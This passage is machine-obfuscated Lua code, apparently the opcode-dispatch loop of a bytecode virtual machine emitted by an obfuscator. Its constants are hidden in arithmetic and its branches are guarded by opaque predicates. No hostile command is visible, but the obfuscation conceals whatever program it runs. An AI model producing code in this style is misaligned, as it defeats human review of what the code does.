-0;while true do if (((1154 -(306 + 516))<((1612 -815) + 79)) and (v226==(0 -(0 + 0)))) then v122=v85[748 -(486 + 260)];v123=v83[v122];v226=1;end if ((v226==(3 -2)) or (535>=(2869 -2172))) then v121=1;break;end end end if ((v121==(1 + 0)) or ((5129 -(44 + 110))<=(1308 + 2693))) then for v233=v122 + (1 -0),v85[3 + (0 -0)] do v7(v123,v83[v233]);end break;end end end elseif ((v86<=(3 -1)) or ((1178 -(764 + 127))==(513 + 50))) then v83[v85[1 + 1]]=v85[11 -8]~=(827 -(819 + 8));elseif (((3358 -(1283 + 415))>=(692 + 555)) and (v86>(2 + (3 -2)))) then local v160=0 + 0 + 0;local v161;local v162;local v163;while true do if ((1==v160) or ((28 + 120)>=(5697 -(622 + 511 + 74 + 344)))) then v163=nil;while true do if (((552 + 895)>=((1735 -878) -558)) and (v161==(0 -0))) then local v261=0;while true do if (((4171 -(630 + 132))==3409) and (v261==0)) then v162=(0 -0) -0;v163=nil;v261=1 + 0 + 0;end if ((v261==(3 -2)) or ((4638 -(61 + 503))>4470)) then v161=1789 -(1178 + 610);break;end end end if (((284 + 1737)==2021) and (v161==1)) then while true do if ((v162==(0 + 0)) or (802>=(2048 + 1513))) then v163=v85[2 -0];v83[v163]=v83[v163](v83[v163 + (3 -2)]);break;end end break;end end break;end if ((2689<=(5316 -(179 + 1283))) and ((0 + 0)==v160)) then v161=1291 -(1020 + 271);v162=nil;v160=764 -(597 + 166);end end elseif (((3080 -(221 + 115))>=(2852 -(872 + 974))) and v83[v85[1 + 1]]) then v67=v67 + 1 + 0;else v67=v85[710 -(595 + 112)];end elseif ((v86<=(1666 -(143 + 1516))) or (1850>(2925 -(27 + (16 -7))))) then if (((17217 -13097)>(3872 -(218 + (1060 -706)))) and (v86<=((1109 -(151 + 29)) -(218 + 706)))) then if (((2348 -(275 + 919))>=((367 + 668) -640)) and (v83[v85[5 -3]]==v85[3 + 1])) then v67=v67 + 1;else v67=v85[748 -(255 + 490)];end elseif (((2406 -(429 + 845))<(38 + 3404)) and (v86==(5 + 1))) then v83[v85[2]]={};else local v165=0 + 0;local v166;local v167;local v168;local v169;local v170;local v171;while true do if (((728 + 646)<=(2865 -(379 + 951))) and (v165==1)) then v168=nil;v169=nil;v165=2;end if ((v165==3) or ((6189 -1717)==1277)) then while true do if ((2931>=2404) and (0==v166)) then local v262=0 -(0 -0);while true do if ((v262==((0 -0) + 0)) or ((2090 -1181)>((2155 -(281 + 174)) + 23))) then v167=0 -0;v168=nil;v262=1 + (0 -0);end if ((v262==(1652 -(944 + 707))) or (((6632 -2844) -(538 + 417))<(2996 -(355 + 843)))) then v166=1;break;end end end if ((v166==(4 -(2 + 1))) or ((3070 -925)>=(11352 -(7514 -(299 + 614))))) then v169=nil;v170=nil;v166=(102 + 228) -(70 + 258);end if (((770 + 2362)>450) and (v166==(1915 -(1179 + 734)))) then v171=nil;while true do if (((48 + 80)<=(4 + 26 + 1778)) and (v167==((480 -220) -(160 + 98)))) then for v313=v168,v68 do local v314=0 + 0;while true do if ((v314==0) or ((4994 -(378 + 333))<=(661 + 193))) then v171=v171 + (3 -(1 + 1));v83[v313]=v169[v171];break;end end end break;end if ((v167==1) or ((1998 -1411)>(3436 + 80))) then local v302=0 -(0 + 0);local v303;while true do if ((v302==(0 + 0)) or (2380==(1755 -973))) then v303=0;while true do if ((163<(1568 -(344 + 542))) and (v303==(1 + (247 -(93 + 154))))) then v167=2;break;end if ((v303==(0 + 0)) or (3187>(4846 -(337 + 97)))) then local v332=502 -(374 + 128);while true do if ((v332==((1672 -(224 + 1447)) -0)) or ((4825 -(59 + 1346))>=4458)) then v303=1 + 0;break;end if (((1096 + 2451)>1991) and (v332==(0 + 0))) then v68=(v170 + v168) -(1 + (1466 -(1385 + 81)));v171=0 -0;v332=1 + 0;end end end end break;end end end if ((v167==0) or ((7598 -4053)<186)) then local v304=0;local v305;while true do if ((v304==(0 -0)) or ((257 + 594)>((6814 -(148 + 714)) -(475 + 1226)))) then v305=0;while true do if (((149 + 3773)==3922) and (v305==(0 + 0))) then local v333=0 -0;while true do if (((3485 -(94 + 380))>=2497) and (v333==0)) then v168=v85[2 -0];v169,v170=v80(v83[v168](v12(v83,v168 + (1 -0),v85[3 -0])));v333=1;end if ((v333==(963 -(570 + (886 -494)))) or ((1633 -846)>=(4150 -2986))) then v305=1500 -(1042 + 457);break;end end end if ((4807>(986 + 1602)) and (v305==(2 -1))) then v167=1 + 0;break;end end break;end end end end break;end end break;end if (((971 -(538 + 433))==v165) or ((2299 -(1037 + 792))>=(2610 -(193 + 324)))) then v166=0 + 0;v167=nil;v165=3 -2;end if ((2==v165) or ((5064 -(84 + 275))<=(6772 -3563))) then v170=nil;v171=nil;v165=1 + 2;end end end elseif ((v86<=8) or ((2657 + 1933)>=4984)) then local v125=0 -(0 -0);local v126;local v127;local v128;while true do if (((581 + 3371)>(529 + 1745)) and (v125==1)) then v128=nil;while true do if ((1494==(18 + 1476)) and ((1 + 0)==v126)) then while true do if (((0 + 0)==v127) or ((168 + 234)>(984 + 1892))) then v128=v85[2];do return v12(v83,v128,v128 + v85[(17 -12) -2]);end break;end end break;end if (((3539 -(245 + 31))>=(599 -(1300 -951))) and ((0 + 0)==v126)) then v127=0 + 0;v128=nil;v126=3 -2;end end break;end if (((15755 -11808)>(9336 -7114)) and (v125==((58 + 143) -(9 + 192)))) then v126=0 -(0 -0);v127=nil;v125=1535 -(1491 + 43);end end elseif ((v86>(35 -26)) or ((261 + 1997)>=(4129 + 467))) then v83[v85[2]][v85[4 -1]]=v83[v85[6 -(962 -(841 + 119))]];else local v173=0;local v174;local v175;while true do if (((2645 + 2270)>(3920 -(99 + 122))) and (v173==(0 + 0))) then v174=(78 -(33 + 45)) + 0;v175=nil;v173=1;end if ((v173==(1 + 0 + 0)) or (1124==(13627 -9250))) then while true do if ((v174==(0 + 0)) or ((7463 -3992)<(5046 -3362))) then v175=v85[1 + 1];v83[v175]=v83[v175](v12(v83,v175 + (1 -0),v85[690 -(7 + 165 + 515)]));break;end end break;end end end elseif ((v86<=(48 -32)) or ((2069 + 1660)<(5336 -(1746 + 61)))) then if (((2793 + (1638 -(305 + 168)))>=1408) and (v86<=(1833 -(1283 + 537)))) then if ((v86<=(25 -14)) or ((3078 -((1672 -(570 + 876)) + 280))>=2708)) then v83[v85[2]]=v29(v78[v85[1 + 0 + 2]],nil,v36);elseif (((1476 + 870)>(1893 -(11 + 901))) and (v86==(8 + 4))) then v36[v85[3]]=v83[v85[4 -2]];else local v177=0;local v178;local v179;local v180;local v181;while true do if (((11093 -7704)>=(24 + 195)) and (v177==(293 -(117 + 175)))) then local v237=0 + 0;while true do if ((v237==(1 + 0)) or (((1929 + 103) -(972 + 431))<(366 + 179))) then v177=1 + 1;break;end if ((4331>(929 + 1153)) and ((1624 -(1332 + 292))==v237)) then v180=nil;v181=nil;v237=1;end end end if (((5 -(1701 -(1586 + 112)))==v177) or ((5570 -4062)>=(15823 -11314))) then while true do if (((1239 + 1556)>(6750 -(816 + 3461))) and ((1 + 0)==v178)) then v181=0;for v284=v179,v85[2 + 2] do local v285=0;local v286;local v287;while true do if (((540 + 16)<=(4694 + 223)) and (0==v285)) then v286=0;v287=nil;v285=1;end if ((v285==((2 + 1) -2)) or ((706 -526)>=(14301 -11277))) then while true do if ((v286==0) or ((9099 -5136)<(1578 -(681 + 359)))) then v287=0 + 0;while true do if (((4437 -(789 + 108))>=(2548 -(160 + 44))) and (v287==(719 -(171 + 548)))) then v181=v181 + ((1881 -(1032 + 846)) -2);v83[v284]=v180[v181];break;end end break;end end break;end end end break;end if (((5260 -(391 + 881 + 570))>2037) and (v178==(581 -(559 + 22)))) then local v264=0 + 0;while true do if ((3787>374) and (v264==(0 + (0 -0)))) then local v306=(0 -0) -0;while true do if ((v306==(1586 -(1234 + 352))) or ((286 + 2863)<=(2567 -(208 + 1023)))) then v179=v85[873 -(612 + 259)];v180={v83[v179](v83[v179 + (303 -(173 + (1412 -(79 + 1204))))])};v306=2 -1;end if ((v306==(1 + 0)) or ((2577 -(71 + 261))<=(2593 -1572))) then v264=1 + 0;break;end end end if (((4 -(1 + 2))==v264) or ((3096 -(449 + 111))>2949)) then v178=1;break;end end end end break;end if ((v177==(0 + 0)) or ((2404 -((779 -(11 + 134)) + 1264))>1418)) then v178=0 + 0;v179=nil;v177=511 -((742 -469) + 237);end end end elseif ((v86<=(21 -(2006 -(1955 + 44)))) or ((791 -((300 -237) + 310))>=(5951 -3043))) then v83[v85[5 -3]]=v83[v85[2 + 1]] -v83[v85[1 + 3]];elseif ((v86==(15 + 0)) or ((8 + 77)==4122)) then if ((v83[v85[1 + 1]]~=v83[v85[11 -7]]) or (2232==(2539 -(135 + 47)))) then v67=v67 + (1490 -(8 + 1481));else v67=v85[8 -5];end else v83[v85[1 + 1]]=v85[10 -(159 -(82 + 70))];end elseif ((v86<=(69 -50)) or ((2742 -((1149 -(360 + 741)) + 102))<=2131)) then if ((v86<=(75 -58)) or ((117 + 185)>(3305 + 203))) then if (((5555 -2205)>=(769 + 1484)) and (v85[(5 -3) + 0]==v83[v85[6 -2]])) then v67=v67 + (1 -0);else v67=v85[3];end elseif ((v86==(6 + 12)) or (2018<=((8148 -6023) -(1044 + 927)))) then local v183=105 -(91 + 14);local v184;local v185;while true do if (((1919 -(1780 + 138))==v183) or ((227 -93)>823)) then while true do if (((776 -(360 + 416))==v184) or ((4044 -(62 + 6))<(642 + 2402))) then v185=v85[1 + 1];do return v83[v185](v12(v83,v185 + (981 -(760 + 220)),v85[3 + 0]));end break;end end break;end if (((3883 + 1074)==(6565 -(657 + 951))) and (v183==(421 -(15 + 406)))) then v184=0 -0;v185=nil;v183=1;end end else local v186=0 + (0 -0);local v187;local v188;while true do if (((480 -(344 + 136))==v186) or ((5337 -(667 + 493))<=(3035 -(27 + 186)))) then local v238=0 -0;while true do if ((v238==1) or ((6412 -4233)>(7571 -4554))) then v186=2 -1;break;end if (((178 + 19)<(11550 -7113)) and (v238==(0 -(486 -(354 + 132))))) then v187=0;v188=nil;v238=1;end end end if ((v186==(4 -3)) or ((1748 -(419 + 406))<(2210 -(707 + 989)))) then while true do if (((1928 -(546 + 4))<=(4099 -(72 + 21))) and (v187==(1521 -(1034 + 487)))) then v188=v85[2];v83[v188]=v83[v188]();break;end end break;end end end elseif ((v86<=20) or (157==(5040 -(434 + 141)))) then do return;end elseif (((4225 -2616)<(433 + (9583 -6625))) and (v86==(680 -(394 + (449 -184))))) then v83[v85[5 -3]]=v83[v85[1749 -(1039 + 707)]][v85[1660 -(215 + 154 + 1287)]];else local v190=(58 + 1245) -(110 + 1193);local v191;local v192;local v193;local v194;while true do if ((v190==2) or ((1521 + 487)>=(2664 + 210))) then while true do if ((v191==(1 -0)) or ((3417 -(629 + 76))<=(697 + 24))) then v194=nil;while true do if ((3506==3506) and (((0 + 0) -(0 + 0))==v192)) then local v307=0 + 0;local v308;while true do if ((2103<=(3326 + 1205)) and (v307==0)) then v308=0 -0;while true do if (((4135 -(291 + 34))==((9383 + 2269) -7842)) and (v308==(1813 -(422 + 1390)))) then v192=4 -(1 + 2);break;end if ((v308==(683 -(571 + 112))) or ((3258 -1885)>=((6163 -(404 + 199)) -(5595 -(848 + 997))))) then local v334=0;while true do if (((194 + 970)>=(388 + 13)) and (v334==((4576 -2871) -(259 + 1445)))) then v308=(1 + 0) -0;break;end if (((1492 -996)<=(4810 -(675 + 1079))) and (v334==0)) then v193=v85[1033 -(781 + 250)];v194={};v334=(6466 -5141) -(210 + 1114);end end end end break;end end end if ((v192==(1 + 0)) or ((5241 -2848)>(1197 + 1571))) then for v315=1 + 0, #v82 do local v316=(0 -0) + 0;local v317;local v318;while true do if ((v316==(1875 -((2804 -(689 + 1232)) + 991))) or (4420==(3072 -(1459 + 501)))) then while true do if (((2923 -(41 + 312))>=(353 + (725 -(385 + 162)))) and (v317==(921 -(406 + 515)))) then v318=v82[v315];for v341=1811 -(1333 + 478), #v318 do local v342=914 -(737 + 177);local v343;local v344;local v345;local v346;while true do if ((v342==(7 -(4 + 1))) or ((7158 -4743)>=3155)) then while true do if ((v343==(0 -0)) or ((1382 -(548 + 357))>=(1127 + 1641))) then local v349=0 -0;while true do if (((941 + 3918)>=(4891 -(89 + 165))) and (v349==0)) then v344=v318[v341];v345=v344[1];v349=1 + (0 -0);end if (((2482 -1193)<=(6243 -3596)) and (v349==1)) then v343=1207 -(239 + 967);break;end end end if ((v343==(71 -((94 -46) + 22))) or ((11815 -8991)<(2094 -(15 + 444)))) then v346=v344[2 -0];if (((v345==v83) and (v346>=v193)) or ((687 + 470)>=(2722 -1021))) then local v350=1662 -(400 + 1262);local v351;while true do if (((884 + 1461)>=(390 + 1017)) and ((0 -0)==v350)) then v351=0 -0;while true do if ((v351==(0 + (94 -(79 + 15)))) or ((4988 -(5 + 771))==(5275 -((1276 -(14 + 459)) + 402)))) then v194[v346]=v345[v346];v344[(35 + 53) -(20 + 67)]=v194;break;end end break;end end end break;end end break;end if (((1957 + 1325)==(2012 + 1270)) and (v342==(399 -(136 + 262)))) then v345=nil;v346=nil;v342=820 -((2601 -(1038 + 945)) + 200);end if (((8675 -5688)<=(4839 -1703)) and (v342==(128 -(125 + 3)))) then v343=806 -(9 + 567 + (308 -(4 + 74)));v344=nil;v342=2 -1;end end end break;end end break;end if ((2402<=2904) and (v316==(615 -(580 + 35)))) then v317=(971 -(397 + 574)) + 0;v318=nil;v316=1 + 0;end end end break;end end break;end if (((3896 + 346)>(108 + (410 -213))) and (v191==((6687 -5117) -(1087 + 483)))) then local v266=123 -(109 + 14);while true do if ((v266==(2 -1)) or ((2930 -(712 + 955))>=3314)) then v191=1;break;end if ((v266==(1880 -(563 + 1317))) or ((633 + 1870)>=3235)) then v192=551 -(327 + 224);v193=nil;v266=3 -2;end end end end break;end if ((v190==1) or ((9335 -5442)==(1208 -288))) then v193=nil;v194=nil;v190=(3148 -1163) -(670 + 1313);end if ((264<=(216 + 1829)) and ((0 + 0)==v190)) then v191=0;v192=nil;v190=1174 -(1007 + 166);end end end elseif ((v86<=(16 + 17)) or ((16373 -11620)<=(3165 -(217 + 34 + 98)))) then if ((v86<=(1863 -(784 + 1052))) or ((5012 -(1946 -(57 + 239)))==(1723 -(597 + 410)))) then if (((298 + 8)<=(12 + (1062 -350))) and (v86<=24)) then if (((861 -(152 + 404))<3175) and (v86>(45 -22))) then local v131=0;local v132;local v133;local v134;local v135;while true do if (((134 + 117)<=(13 + 350 + 189)) and (v131==(1810 -(764 + 1045)))) then v134=nil;v135=nil;v131=2 + 0;end if ((v131==(1225 -(862 + 363))) or ((1685 -(605 + 291))<=(1155 -(493 + 609)))) then v132=(0 + 0) -0;v133=nil;v131=1;end if (((665 -(497 + 166))==v131) or ((5073 -(467 + 103))<=((2938 -(234 + 1064)) + 1379))) then while true do if (((1016 + 217)<=(3489 -1593)) and (v132==(0 + 0))) then local v239=0;while true do if (((613 + 319)<(5373 -1730)) and ((0 + 0)==v239)) then v133=v78[v85[1999 -(452 + 1544)]];v134=nil;v239=250 -(194 + 55);end if (((63 -(10 + 15))<=4106) and (v239==(1 + 0))) then v132=1 -(1960 -(574 + 1386));break;end end end if ((v132==1) or ((2126 -(519 + 578))<=((2611 -1695) -299))) then v135={};v134=v9({},{__index=function(v250,v251)local v267=0 + 0;local v268;local v269;while true do if ((v267==(1 + 0 + 0)) or (3406<3101)) then while true do if ((v268==(0 + 0)) or ((11235 -7886)<=1983)) then v269=v135[v251];return v269[1 + 0][v269[2]];end end break;end if ((v267==0) or (1344>=2629)) then v268=0 -0;v269=nil;v267=1 + 0;end end end,__newindex=function(v252,v253,v254)local v270=0;local v271;local v272;local v273;while true do if ((v270==(0 -0)) or ((3741 -(182 + 152))>(612 + 3295))) then v271=136 -(67 + 69);v272=nil;v270=1 -(0 + 0);end if ((v270==1) or (578>(8082 -3480))) then v273=nil;while true do if (((3 + 4 + 56)==(47 + 16)) and ((1 -0)==v271)) then while true do if (((1733 -(1547 + 186))==v272) or ((10397 -6483)<=(321 + 129))) then v273=v135[v253];v273[1 + 0][v273[6 -4]]=v254;break;end end break;end if ((v271==(0 -0)) or ((1616 + 515 + 2726)<=(17225 -13605))) then v272=1401 -(244 + 1157);v273=nil;v271=1556 -(292 + 1205 + 58);end end break;end end end});v132=2;end if ((v132==(7 -(2 + 3))) or ((2563 -615)>(7939 -5660))) then for v255=(1 -0) + 0,v85[11 -7] do local v256=0;local v257;local v258;while true do if ((v256==0) or ((2307 -(1246 + 626))>=3067)) then v257=1258 -(218 + 1040);v258=nil;v256=1 + (0 -0);end if (((1 -0)==v256) or (856>(3042 -(89 + 756)))) then while true do if (((403 + 449 + 305)<((9101 -4674) -((2190 -(300 + 93)) + 147))) and (v257==0)) then local v320=0 + 0;while true do if (((8010 -4538)==(2856 + 616)) and (v320==(1 + 0))) then v257=1 -0;break;end if ((((4830 -(350 + 735)) -(518 + 494))==(10757 -8024)) and (0==v320)) then v67=v67 + 1 + 0;v258=v76[v67];v320=1446 -((4263 -2928) + (607 -(251 + 246)));end end end if ((v257==(1 -0)) or ((2383 + 864)<(69 -21))) then if (((2441 -(46 + 119))<(2670 + 1989)) and (v258[1 -0]==(1625 -(489 + 1106)))) then v135[v255-(3 -2)]={v83,v258[3 + 0]};else v135[v255-1]={v35,v258[7 -4]};end v82[ #v82 + (2 -1)]=v135;break;end end break;end end end v83[v85[3 -1]]=v29(v133,v134,v36);break;end end break;end end else v83[v85[4 -2]]=v36[v85[3]];end elseif ((((2806 -(59 + 6)) -(171 + 213))<=(312 + 2318)) and (v86<=25)) then v67=v85[3];elseif ((((7563 -(85 + 296)) -3864)>=(4906 -(1159 + 553))) and (v86==(43 -(6 + 11)))) then local v195=274 -(19 + 255);local v196;local v197;while true do if ((1709<=(2472 + 316)) and (v195==1)) then while true do if ((v196==0) or ((2562 + 434)<=356)) then v197=v85[(682 + 64) -(642 + 102)];v83[v197](v12(v83,v197 + 1 + 0,v85[1 + (1275 -(224 + 1049))]));break;end end break;end if (((2743 + 273)<=3814) and (v195==0)) then v196=0;v197=nil;v195=1685 -(1136 + 548);end end else for v227=v85[2],v85[1217 -(1111 + 103)] do v83[v227]=nil;end end elseif ((v86<=(2028 -(1767 + 231))) or ((890 -(367 + 456))>=2917)) then if ((v86<=(1234 -(408 + 798))) or (359>3939)) then local v137=0;local v138;local v139;local v140;local v141;local v142;local v143;while true do if ((2394==(1549 + 845)) and (v137==(2 + 0))) then v142=nil;v143=nil;v137=475 -(8 + 464);end if (((1504 -(29 + 0 + 734))<=(2127 + 71)) and (v137==(1 + 0))) then v140=nil;v141=nil;v137=1153 -(166 + 985);end if ((v137==(0 + 0)) or ((744 + 5)==((306 + 4744) -(1943 + (1941 -(1828 + 82)))))) then v138=0 + 0;v139=nil;v137=1 -0;end if (((3 + 0)==v137) or ((6154 -((1030 -(156 + 184)) + 1174))<=(4871 -(1459 + 988)))) then while true do if (((5 -2)==v138) or ((20582 -15961)==(308 + 1583))) then if (v143 or ((9 + 29)>(9064 -7099))) then local v274=1233 -((2385 -(193 + 1024)) + 65);local v275;while true do if ((v274==(920 -(789 + 131))) or (4532>=((15352 -9458) -(748 + 361)))) then v275=0;while true do if (((0 -0)==v275) or ((867 -(89 + 746))>(7894 -5891))) then v83[v141]=v143;v67=v85[3];break;end end break;end end else v67=v67 + 1;end break;end if ((v138==(102 -((1984 -(923 + 974)) + 11 + 2))) or ((3264 + 329)>((5636 -(200 + 369)) -(657 + 133 + 8)))) then for v259=1 + 0,v140 do v83[v141 + v259]=v142[v259];end v143=v142[1 -0];v138=177 -(65 + 109);end if ((v138==(1268 -(100 + 1167))) or (103==1745)) then v141=v139 + 2;v142={v83[v139](v83[v139 + 1 + 0],v83[v141])};v138=1 + 1;end if (((733 + 1591)<=(8620 -4268)) and (v138==((902 + 968) -(1411 + 459)))) then local v241=1598 -(226 + (6069 -4697));while true do if (((4927 -3007)>=((2293 -(432 + 107)) -(322 + 45))) and (v241==1)) then v138=821 -(629 + 191);break;end if ((v241==(0 -0)) or (((2732 -(210 + 1013)) + 3115)==(447 + 1537))) then v139=v85[2 + 0];v140=v85[2 + 1 + (3 -2)];v241=37 -(34 + 2);end end end end break;end end elseif ((v86>(13 + 16)) or ((3611 -(214 + 344))<=(3178 -(434 + 732)))) then v83[v85[7 -5]]=v83[v85[1 + 2 + 0]];else local v199=0 -0;local v200;local v201;local v202;while true do if ((v199==(0 -0)) or (1962>=4018)) then v200=0 -0;v201=nil;v199=1;end if ((v199==(314 -(58 + 255))) or ((661 -(29 + 222))>(3205 -(1357 + 583)))) then v202=nil;while true do if (((357 + 187)<=((8596 -(40 + 524)) -5876)) and (1==v200)) then while true do if ((v201==0) or ((1081 + 919)>=4055)) then v202=v85[(1569 -(1529 + 38)) + 0];do return v12(v83,v202,v68);end break;end end break;end if ((((5027 -(877 + 945)) -(99 + 330 + 1307))<=4995) and (v200==(0 + 0))) then local v276=0 -0;while true do if (((3356 + 1284)>(2900 -1058)) and ((0 + 0 + 0)==v276)) then v201=0 -0;v202=nil;v276=1 + 0 + 0;end if (((4214 -((389 -190) + (398 -(40 + 55))))<=(549 + 4116)) and ((1 -(1156 -(817 + 339)))==v276)) then v200=1;break;end end end end break;end end end elseif ((v86<=(10 + 21)) or ((5959 -(992 + 953))<(123 + 523))) then local v144=0 -0;local v145;local v146;local v147;while true do if ((1634<((9568 -(76 + 2)) -5234)) and (v144==(0 + (1426 -(1004 + 422))))) then v145=0;v146=nil;v144=1166 -(940 + 225);end if (((4188 -2902)==(79 + 115 + 1092)) and (v144==(1 -0))) then v147=nil;while true do if ((((8213 -5147) + 1825)>(928 + 413)) and (((532 + 173) -(85 + 620))==v145)) then local v242=0 + 0;while true do if ((v242==0) or ((2196 -(472 + 75))<=(3357 -1976))) then v146=0 -(0 -0);v147=nil;v242=13 -(4 + 8);end if (((10092 -6790)<=(11066 -7272)) and (v242==(1 + 0))) then v145=1 -0;break;end end end if ((((1789 -971) -(1009 -799))<3234) and (v145==(2 -1))) then while true do if (((0 -0)==v146) or ((5359 -3198)==(344 + 1802))) then v147=v85[1484 -(350 + 1132)];v83[v147](v12(v83,v147 + (3 -2) + 0,v68));break;end end break;end end break;end end elseif ((v86>(875 -(646 + 197))) or ((6884 -(869 + 1125))==(3537 + 523))) then v83[v85[2]]();else v83[v85[4 -2]]=v35[v85[2 + 1 + 0]];end elseif ((v86<=39) or (869>(7544 -5479))) then if ((v86<=(88 -(47 + 5))) or (4026<=3927)) then if (((7601 -5492)>=(3080 -(691 + 696))) and (v86<=(6 + (520 -(316 + 176))))) then local v148=0 + 0 + 0;local v149;local v150;local v151;while true do if ((v148==0) or ((4899 -(1182 + 123))<=(6918 -3644))) then v149=0 + 0;v150=nil;v148=4 -(585 -(387 + 195));end if (((5140 -(283 + 235))==(5757 -(671 + 313 + 151))) and (v148==((812 -541) -(248 + 22)))) then v151=nil;while true do if ((v149==(1 -0)) or (4739<=(451 + 358))) then while true do if ((((6058 -(706 + 214)) -(507 + 488))>(2398 + 108)) and (v150==0)) then v151=v85[2 + 0];v83[v151](v83[v151 + 1 + (0 -0)]);break;end end break;end if ((v149==(0 + 0)) or ((2364 -832)>=(1702 + 1754))) then local v243=0 -0;while true do if (((3 -2)==v243) or ((62 + 381)>(2330 -(818 + 597)))) then v149=1;break;end if (((9746 -5082)==((13945 -(75 + 153)) -9053)) and (v243==(0 -0))) then v150=1551 -(469 + 314 + 768);v151=nil;v243=1 + 0;end end end end break;end end elseif ((v86==(90 -55)) or (4315==(3802 -(443 + 334 + 281)))) then v83[v85[2 + 0]]=v83[v85[3]]/v85[1421 -(1347 + 70)];else do return v83[v85[4 -2]];end end elseif ((v86<=37) or ((4152 -1458)<(403 + 1515))) then if (((2344 + 381)<(7712 -4848)) and  not v83[v85[5 -3]]) then v67=v67 + (4 -3);else v67=v85[3];end elseif (((3396 -2709)==(192 + 495)) and (v86>((312 -(45 + 37)) -(33 + 81 + 78)))) then local v205=0 -0;local v206;local v207;local v208;local v209;while true do if ((v205==(9 -7)) or ((4717 -3582)<(1749 -815))) then while true do if (((6559 -(1135 + 745))<(12575 -(8463 -(616 + 43)))) and (v206==(1498 -(661 + 837)))) then local v277=0;while true do if ((v277==(189 -(114 + 75))) or (263>=(440 + 758))) then v207=v85[2];v208={v83[v207](v12(v83,v207 + 1,v68))};v277=713 -(53 + 659);end if ((v277==(2 -1)) or ((670 + 1030)>=(227 + 1971))) then v206=2 -1;break;end end end if ((v206==(1041 -(150 + 890))) or ((433 + 497)>=(713 + 586 + 552))) then v209=0 + 0;for v288=v207,v85[1743 -(394 + 1345)] do local v289=1858 -(486 + 1372);local v290;while true do if ((v289==(0 + (149 -(50 + 99)))) or ((12375 -7810)<=4194)) then v290=1901 -(565 + 1336);while true do if (((8270 -(1500 + 3912))>=(2205 -1479)) and (v290==(0 + 0))) then v209=v209 + (1533 -(107 + 1425));v83[v288]=v208[v209];break;end end break;end end end break;end end break;end if (((1725 + 36)<=(847 + 1292)) and (v205==(1765 -(1124 + 641)))) then v206=0 + 0;v207=nil;v205=1 -0;end if ((v205==(1 + 0)) or (((21454 -14908) -(463 + 1394))<2154)) then v208=nil;v209=nil;v205=2;end end else v35[v85[821 -(272 + 546)]]=v83[v85[1041 -(118 + 8 + 913)]];end elseif ((v86<=42) or ((3645 + 1240)==(8622 -5470))) then if (((7104 -3665)>=(519 + 1771)) and (v86<=40)) then v83[v85[1 + 1]]= -v83[v85[5 -2]];elseif (((9178 -5577)==3601) and (v86==41)) then local v211=0;local v212;local v213;local v214;local v215;while true do if (((6442 -(1492 + 297))>(4332 -(1250 + 303))) and (v211==(2 -1))) then v214=nil;v215=nil;v211=758 -(474 + 282);end if ((((339 -(126 + 211)) + 0)==v211) or (2432<=746)) then while true do if (((5156 -(172 + 134 + 376))>=(4547 -(747 + 43))) and (v212==(748 -(230 + 517)))) then v215=nil;while true do if (((3553 -596)<=((2042 -(617 + 1059)) + 3696)) and (v213==(2 -(1065 -(549 + 515))))) then v83[v214 + 1]=v215;v83[v214]=v215[v85[3 + 1 + 0]];break;end if ((v213==((45 + 676) -(82 + (1197 -558)))) or (4901<=(4939 -2596))) then local v311=0;local v312;while true do if (((13089 -8343)>=(4215 -(1156 + 674))) and (v311==(0 -0))) then v312=0;while true do if ((v312==(3 -2)) or ((13275 -9876)<(3901 -2879))) then v213=1 -0;break;end if (((1688 + 1635)>((2168 -(733 + 817)) + 1516)) and ((0 + 0)==v312)) then local v336=0 + 0;while true do if (((1758 + 2192)>=3583) and (v336==0)) then v214=v85[2 -0];v215=v83[v85[3]];v336=1 -0;end if ((v336==((281 + 147) -(215 + 212))) or ((7127 -5468)>(428 + 3218))) then v312=1;break;end end end end break;end end end end break;end if (((2600 + 577)<=(612 + 3128)) and (v212==(854 -(826 + 28)))) then local v278=0 -0;while true do if ((v278==(1 + 0)) or (((26422 -20710) -(586 + 741))==4623)) then v212=1 + 0;break;end if (((0 + 0)==v278) or ((5969 -(362 + 617))==(9202 -5978))) then v213=0 + 0;v214=nil;v278=1 + 0;end end end end break;end if (((4200 -(1348 + 51))>=1521) and (v211==(1680 -(1131 + 549)))) then v212=(0 -0) + 0;v213=nil;v211=1 -0;end end else local v216=1926 -((4653 -2843) + 116);local v217;local v218;local v219;local v220;local v221;while true do if (((405 -(346 + 1 + 33))<=(3500 -1359)) and (v216==(0 -0))) then v217=(1430 -(862 + 568)) + 0;v218=nil;v216=57 -(30 + 26);end if (((1251 -(3512 -2584))<=((765 -(20 + 25)) + 576)) and (v216==(1200 -(648 + (1622 -1072))))) then v221=nil;while true do if (((7466 -4262)>=(1812 -1402)) and (v217==(2 + 0))) then for v291=v218,v68 do local v292=0 -0;local v293;local v294;while true do if ((v292==1) or ((3856 + 695)<=(11124 -8065))) then while true do if ((v293==(545 -(76 + 436 + 33))) or ((9032 -5312)<(10448 -(2388 + 4445)))) then v294=0 + 0 + 0;while true do if ((v294==0) or ((228 + 3267)<=(3888 -((1598 -(323 + 56)) + 479)))) then v221=v221 + (1403 -(409 + 993));v83[v291]=v219[v221];break;end end break;end end break;end if (((2393 -(925 + 958))<883) and (v292==(0 -0))) then v293=0 -(1604 -(620 + 984));v294=nil;v292=1661 -(346 + 1314);end end end break;end if ((v217==(1185 -(322 + 862))) or ((3234 -(1456 + 133))>=(8063 -3752))) then v68=(v220 + v218) -((1 + 2) -2);v221=(1000 -(379 + 621)) + 0;v217=2;end if (((2396 + 1221)>=945) and (v217==(0 -0))) then v218=v85[2 + 0];v219,v220=v80(v83[v218](v83[v218 + (849 -(770 + 20 + 58))]));v217=1;end end break;end if (((1564 + 1939)<=(7640 -3277)) and (v216==(1 + 0))) then v219=nil;v220=nil;v216=1 + 1;end end end elseif ((v86<=43) or ((244 -79)==4386)) then local v153=211 -(81 + 130);local v154;local v155;local v156;local v157;local v158;while true do if (((8578 -5461)>=(3943 -(1093 + 357))) and ((0 + (0 -0))==v153)) then v154=(0 -0) -0;v155=nil;v153=1704 -(1506 + 197);end if (((2313 -(1353 + 354))==(867 -(1027 -766))) and (v153==2)) then v158=nil;while true do if ((3166<=(7174 -3998)) and (v154==(2 + 0))) then while true do if ((v155==(312 -(172 + 140))) or (((14497 -9007) -(124 + 440))<516)) then local v295=(0 + 0) -0;local v296;while true do if ((v295==(0 -0)) or ((178 + 179)>=2446)) then v296=0 -0;while true do if ((v296==1) or ((4135 -(338 + 970))<=(1539 -793))) then v155=3 -2;break;end if (((1062 + 3361)==(3287 + 1136)) and (v296==(1316 -(1111 + 205)))) then local v331=43 -(27 + 16);while true do if ((2103<(1680 + 2730)) and (v331==(1 + 0))) then v296=1338 -(935 